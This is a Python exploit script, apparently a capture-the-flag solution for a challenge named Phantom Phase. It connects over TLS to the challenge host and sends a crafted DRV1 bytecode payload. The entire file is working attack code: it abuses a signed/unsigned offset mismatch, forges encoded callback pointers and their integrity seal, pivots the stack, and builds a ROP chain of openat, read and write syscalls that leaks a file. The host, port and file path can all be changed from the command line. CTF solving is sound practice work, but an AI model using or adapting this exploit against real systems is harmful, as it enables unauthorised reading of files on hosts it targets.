#!/usr/bin/env python3
"""Exploit Phantom Phase's signed/unsigned DRV1 memory-offset mismatch."""

from __future__ import annotations

import socket
import ssl
import struct
import sys


HOST = "phantom-phase-fb785313a3b6.chals.z0d1ak.org"
PORT = 1337
FLAG_PATH = "/run/flag.txt"

OP = {
    "MOVI": 0x01,
    "MOV": 0x02,
    "ADD": 0x03,
    "SUB": 0x04,
    "XOR": 0x05,
    "ROL": 0x09,
    "ROR": 0x0A,
    "LOADQ": 0x0B,
    "STOREQ": 0x0C,
    "HALT": 0x10,
}


def ins(op: str, dst: int = 0, src: int = 0, imm: int = 0) -> bytes:
    return struct.pack("<BBBBHH", OP[op], dst, src, 0, imm, 0)


def payload(path: str = FLAG_PATH) -> bytes:
    code = [
        # guest_base is stored at real_base+0x700, which is guest_base-0x200.
        ins("LOADQ", dst=0, imm=0xE00),
        ins("MOVI", dst=1, imm=0x900),
        ins("SUB", dst=0, src=1),
        ins("MOV", dst=7, src=0),        # preserve allocation base
        ins("STOREQ", src=0, imm=0xE00),

        # With guest_base redirected to real_base, expose the callback vectors.
        ins("LOADQ", dst=0, imm=0x00),   # encoded phase-0 callback
        ins("MOV", dst=3, src=0),        # preserve old phase-0 encoding
        ins("LOADQ", dst=2, imm=0x28),   # per-process vector key
        ins("ROR", dst=0, imm=17),       # decode original phase 0
        ins("XOR", dst=0, src=2),        # R0 = PIE + 0x17c0
        ins("MOV", dst=6, src=0),        # retain known text pointer
        ins("MOVI", dst=1, imm=0x70),
        ins("SUB", dst=0, src=1),        # R0 = PIE + 0x1750 (stack pivot)
        ins("XOR", dst=0, src=2),
        ins("ROL", dst=0, imm=17),       # encode pivot as phase 0
        ins("LOADQ", dst=2, imm=0x20),   # vector integrity seal

        # seal' = seal ^ old_phase0 ^ new_phase0
        ins("XOR", dst=2, src=3),
        ins("XOR", dst=2, src=0),
        ins("STOREQ", src=0, imm=0x00),
        ins("STOREQ", src=2, imm=0x20),
    ]

    # Preserve the allocation base and redirect memory operations to the ROP area.
    code.extend([
        ins("MOVI", dst=4, imm=0xD00),
        ins("ADD", dst=7, src=4),        # R7 = heap + 0xd00
        ins("STOREQ", src=7, imm=0x700),
        ins("MOVI", dst=4, imm=0xD00),
        ins("SUB", dst=7, src=4),        # restore R7 = heap
    ])

    # All useful gadgets sit immediately before phase-0 at PIE+0x17c0.
    pop_rax = 0x60
    pop_rdi = 0x50
    pop_rsi = 0x40
    pop_rdx = 0x30
    xchg_rax_rdi = 0x20
    syscall = 0x10

    def store_gadget(slot: int, delta: int) -> None:
        code.extend([
            ins("MOV", dst=4, src=6),
            ins("MOVI", dst=5, imm=delta),
            ins("SUB", dst=4, src=5),
            ins("STOREQ", src=4, imm=slot),
        ])

    def store_const(slot: int, value: int) -> None:
        if value >= 0:
            code.extend([
                ins("MOVI", dst=4, imm=value),
                ins("STOREQ", src=4, imm=slot),
            ])
        else:
            code.extend([
                ins("MOVI", dst=4, imm=0),
                ins("MOVI", dst=5, imm=-value),
                ins("SUB", dst=4, src=5),
                ins("STOREQ", src=4, imm=slot),
            ])

    def store_heap_ptr(slot: int, offset: int) -> None:
        code.extend([
            ins("MOV", dst=4, src=7),
            ins("MOVI", dst=5, imm=offset),
            ins("ADD", dst=4, src=5),
            ins("STOREQ", src=4, imm=slot),
        ])

    # openat(AT_FDCWD, path, O_RDONLY, 0)
    store_gadget(0x00, pop_rax)
    store_const(0x08, 257)
    store_gadget(0x10, pop_rdi)
    store_const(0x18, -100)
    store_gadget(0x20, pop_rsi)
    store_heap_ptr(0x28, 0xE80)
    store_gadget(0x30, pop_rdx)
    store_const(0x38, 0)
    store_gadget(0x40, syscall)
    store_gadget(0x48, xchg_rax_rdi)

    # read(fd, heap+0xf00, 0x100)
    store_gadget(0x50, pop_rax)
    store_const(0x58, 0)
    store_gadget(0x60, pop_rsi)
    store_heap_ptr(0x68, 0xF00)
    store_gadget(0x70, pop_rdx)
    store_const(0x78, 0x100)
    store_gadget(0x80, syscall)

    # write(1, heap+0xf00, 0x100)
    store_gadget(0x88, pop_rax)
    store_const(0x90, 1)
    store_gadget(0x98, pop_rdi)
    store_const(0xA0, 1)
    store_gadget(0xA8, pop_rsi)
    store_heap_ptr(0xB0, 0xF00)
    store_gadget(0xB8, pop_rdx)
    store_const(0xC0, 0x100)
    store_gadget(0xC8, syscall)

    # exit(0)
    store_gadget(0xD0, pop_rax)
    store_const(0xD8, 60)
    store_gadget(0xE0, pop_rdi)
    store_const(0xE8, 0)
    store_gadget(0xF0, syscall)
    code.append(ins("HALT"))

    encoded_path = path.encode() + b"\x00"
    if len(encoded_path) > 0x80:
        raise ValueError("path is too long")
    data = bytearray(0x600)
    data[0x580:0x580 + len(encoded_path)] = encoded_path
    blob = (
        struct.pack("<4sHHI", b"DRV1", len(code), len(data), 0)
        + b"".join(code)
        + bytes(data)
    )
    return struct.pack("<I", len(blob)) + blob


def recv_all(sock: ssl.SSLSocket) -> bytes:
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
        except (TimeoutError, socket.timeout):
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    path = sys.argv[3] if len(sys.argv) > 3 else FLAG_PATH
    context = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=10) as raw:
        with context.wrap_socket(raw, server_hostname=host) as tube:
            tube.settimeout(5)
            banner = tube.recv(4096)
            sys.stdout.buffer.write(banner)
            tube.sendall(payload(path))
            sys.stdout.buffer.write(recv_all(tube).rstrip(b"\x00"))


if __name__ == "__main__":
    main()
